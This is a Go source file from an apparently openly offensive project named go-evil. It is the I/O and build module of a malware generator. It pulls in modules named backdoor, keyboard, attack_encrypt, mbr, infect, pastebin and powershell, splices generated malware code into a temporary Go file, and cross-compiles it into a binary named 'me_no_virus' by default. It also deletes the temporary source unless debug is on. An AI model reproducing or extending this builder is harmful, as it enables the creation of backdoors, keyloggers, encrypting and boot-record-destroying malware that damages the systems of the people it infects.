package io

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
	"gopkg.in/go-rillas/subprocess.v1"
)

var debug bool = false // If this is true, then we will save the go-file that we compile
var test_mode string   // Will make the for loop run once, independant if an exit statement exists
var domains []string

const (
	sys            = "\tsys \"github.com/s9rA16Bf4/go-evil/domains/system/private\""
	win            = "\twin \"github.com/s9rA16Bf4/go-evil/domains/window/private\""
	time           = "\ttime \"github.com/s9rA16Bf4/go-evil/domains/time/private\""
	keyboard       = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard/private\""
	attack_hash    = "\tattack_hash \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash/private\""
	attack_encrypt = "\tattack_encrypt \"github.com/s9rA16Bf4/go-evil/domains/attack_vector/encrypt/private\""
	back           = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor/private\""
	syscall        = "\"syscall\""
	net            = "\tnet \"github.com/s9rA16Bf4/go-evil/domains/network/private\""
	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell/private\""
	pastebin       = "\tpastebin \"github.com/s9rA16Bf4/go-evil/domains/pastebin/private\""
	mbr            = "\tmbr \"github.com/s9rA16Bf4/go-evil/domains/mbr/private\""
	infect         = "\tinfect \"github.com/s9rA16Bf4/go-evil/domains/infect/private\""

	// Related to webview
	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
	view_x86   = "https://github.com/webview/webview/raw/master/dll/x86/webview.dll"
	loader_x64 = "https://github.com/webview/webview/raw/master/dll/x64/WebView2Loader.dll"
	view_x64   = "https://github.com/webview/webview/raw/master/dll/x64/webview.dll"

	// Variables
	run = "\truntime \"github.com/s9rA16Bf4/go-evil/utility/variables/runtime\""
)

func Append_domain(domain string) {
	switch domain {
	case "system":
		if !find(sys) && !mal.Is_disabled("sys") {
			notify.Log("Adding domain 'system'", notify.Verbose_lvl, "2")
			domains = append(domains, sys)
		}
	case "window":
		if !find(win) && !mal.Is_disabled("win") {
			notify.Log("Adding domain 'window'", notify.Verbose_lvl, "2")
			domains = append(domains, win)
		}
	case "time":
		if !find(time) && !mal.Is_disabled("time") {
			notify.Log("Adding domain 'time'", notify.Verbose_lvl, "2")
			domains = append(domains, time)
		}

	case "keyboard":
		if !find(keyboard) && !mal.Is_disabled("keyboard") {
			notify.Log("Adding domain 'keyboard'", notify.Verbose_lvl, "2")
			domains = append(domains, keyboard)
		}
	case "attack_hash":
		if !find(attack_hash) && !mal.Is_disabled("attack_hash") {
			notify.Log("Adding domain 'attack_hash'", notify.Verbose_lvl, "2")
			domains = append(domains, attack_hash)
		}
	case "attack_encrypt":
		if !find(attack_encrypt) && !mal.Is_disabled("attack_encrypt") {
			notify.Log("Adding domain 'attack_encrypt'", notify.Verbose_lvl, "2")
			domains = append(domains, attack_encrypt)
		}
	case "backdoor":
		if !find(back) && !mal.Is_disabled("backdoor") {
			notify.Log("Adding domain 'backdoor'", notify.Verbose_lvl, "2")
			domains = append(domains, back)
		}
	case "syscall":
		if !find(syscall) && !mal.Is_disabled("syscall") {
			notify.Log("Adding library 'syscall'", notify.Verbose_lvl, "2")
			domains = append(domains, syscall)
		}
	case "network":
		if !find(net) && !mal.Is_disabled("net") {
			notify.Log("Adding library 'network'", notify.Verbose_lvl, "2")
			domains = append(domains, net)
		}
	case "powershell":
		if !find(pwsh) && !mal.Is_disabled("pwsh") {
			notify.Log("Adding library 'powershell'", notify.Verbose_lvl, "2")
			domains = append(domains, pwsh)
		}
	case "pastebin":
		if !find(pastebin) && !mal.Is_disabled("pastebin") {
			notify.Log("Adding library 'pastebin'", notify.Verbose_lvl, "2")
			domains = append(domains, pastebin)
		}
	case "mbr":
		if !find(mbr) && !mal.Is_disabled("mbr") {
			notify.Log("Adding library 'MBR'", notify.Verbose_lvl, "2")
			domains = append(domains, mbr)
		}
	case "infect":
		if !find(infect) && !mal.Is_disabled("infect") {
			notify.Log("Adding library 'infect'", notify.Verbose_lvl, "2")
			domains = append(domains, infect)
		}
	case "runtime":
		if !find(run) {
			notify.Log("Adding library 'runtime'", notify.Verbose_lvl, "2")
			domains = append(domains, run)
		}
	}
}

func Set_target_OS(new_os string) {
	notify.Log("Updating target os, "+new_os, notify.Verbose_lvl, "2")
	os.Setenv("GOOS", new_os)

}
func Set_target_ARCH(new_arch string) {
	notify.Log("Updating target architecture, "+new_arch, notify.Verbose_lvl, "2")
	os.Setenv("GOARCH", new_arch)
}

func Set_debug(new_debug bool) {
	debug = new_debug
}

func Set_testMode(new_mode bool) {
	if new_mode {
		test_mode = "i := 0; i < 1; i++"
		mal.Disable_domain("win")      // Window domain
		mal.Disable_domain("time")     // Time management domain
		mal.Disable_domain("sys")      // System domain
		mal.Disable_domain("back")     // Backdoor
		mal.Disable_domain("keyboard") // Keyboard
		mal.Disable_domain("pastebin") // pastebin
		mal.Disable_domain("mbr")      // Master boot record
		mal.Disable_domain("infect")   // We don't wanna infect ourself
	}
}

func find(domain string) bool {
	for _, line := range domains {
		if domain == line {
			return true
		}
	}
	return false
}

func Write_file() {
	base_code := []string{
		"package main",
		"import (",
		"\"github.com/cloudfoundry/jibber_jabber\"",
	}
	base_code = append(base_code, domains...)                  // Which domains to include
	base_code = append(base_code, ")", "func main(){")         // Main function and closing include tag
	base_code = append(base_code, mal.Region_is_disabled()...) // Will stop the malware from running if it has been told too
	base_code = append(base_code, "for "+test_mode+" {")       // While loop
	base_code = append(base_code, mal.GetContent()...)         // Insert the malware code
	base_code = append(base_code, "}}")                        // And insert the end

	if mal.GetName() == "" {
		mal.SetBinaryName("me_no_virus")
	}

	file, _ := os.Create("output/temp.go") // We utilize a temp directory
	write := bufio.NewWriter(file)

	for _, line := range base_code {
		notify.Log("Writing line '"+line+"' to the target file", notify.Verbose_lvl, "3")
		_, err := write.WriteString(line + "\n")
		if err != nil {
			notify.Error("Failed to write to disk", "io.write_file()")
			return
		}
	}
	write.Flush()
}

func Read_file(file string) string {
	file_gut, err := ioutil.ReadFile(file)
	if err != nil {
		notify.Error(err.Error(), "io.read_file()")
		return ""
	}
	return string(file_gut)
}

func Compile_file() {
	if os.Getenv("GOOS") == "windows" && mal.GetExtension() == "" {
		mal.SetExtension(".exe") // Apparently golang on windows doesn't do this automatically
		notify.Log("Setting .exe extension on the target file", notify.Verbose_lvl, "3")
	}
	arg := "build -o output/" + mal.GetName() + mal.GetExtension() + " output/temp.go"
	cmd := exec.Command("go", strings.Split(arg, " ")...)
	notify.Log("Compiling malware", notify.Verbose_lvl, "1")

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err != nil {
		notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
		return
	}

	if !debug {
		notify.Log("Removing the temoporarly made golang file", notify.Verbose_lvl, "2")
		arg = "output/temp.go"
		cmd = exec.Command("rm", strings.Split(arg, " ")...)
		err := cmd.Run()

		if err != nil {
			notify.Error(fmt.Sprint(err)+": "+stderr.String(), "io.compile_file()")
			return
		}
	}
	create_dll() // Creates only if necessary to the somewhat required dll files (only on windows)
}

func create_dll() {
	if runtime.GOOS == "windows" { // Only required on windows, seems like most posix systems has this already included
		_, err := os.Stat("output/WebView2Loader.dll")
		if err != nil {
			notify.Log("Creating DLL file 'WebView2Loader.dll'", notify.Verbose_lvl, "2")
			create_WebView2Loader()
		}
		_, err = os.Stat("output/webview.dll")
		if err != nil {
			notify.Log("Creating DLL file 'webView.dll'", notify.Verbose_lvl, "2")
			create_webView()
		}
	}
}
func create_webView() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = view_x64
	} else {
		target = view_x86
	}
	notify.Log("Downloading 'webView.dll'", notify.Verbose_lvl, "3")
	response, err := http.Get(target)
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
		return
	}
	out, err := os.Create("output/webView.dll")
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
		return
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Error(err.Error(), "io.create_webView()")
		return
	}
}
func create_WebView2Loader() {
	target := ""
	if os.Getenv("GOARCH") == "x64" {
		target = loader_x64
	} else {
		target = loader_x86
	}
	notify.Log("Downloading 'WebView2Loader.dll'", notify.Verbose_lvl, "3")
	response, err := http.Get(target)
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
		return
	}
	out, err := os.Create("output/WebView2Loader.dll")
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
		return
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		notify.Error(err.Error(), "io.create_WebView2Loader()")
		return
	}
}

func Create_file(file_name string, gut []string) {
	file, err := os.Create(file_name)
	if err != nil {
		notify.Error(err.Error(), "io.Create_file()")
		return
	}
	write := bufio.NewWriter(file)
	for _, line := range gut {
		write.WriteString(line + "\n")
	}
	write.Flush()
}

func Run_file(file_path string) string {
	resp := subprocess.RunShell("", "", file_path)
	return resp.StdOut
}
func Remove_file(file_path string) {
	os.Remove(file_path)
}
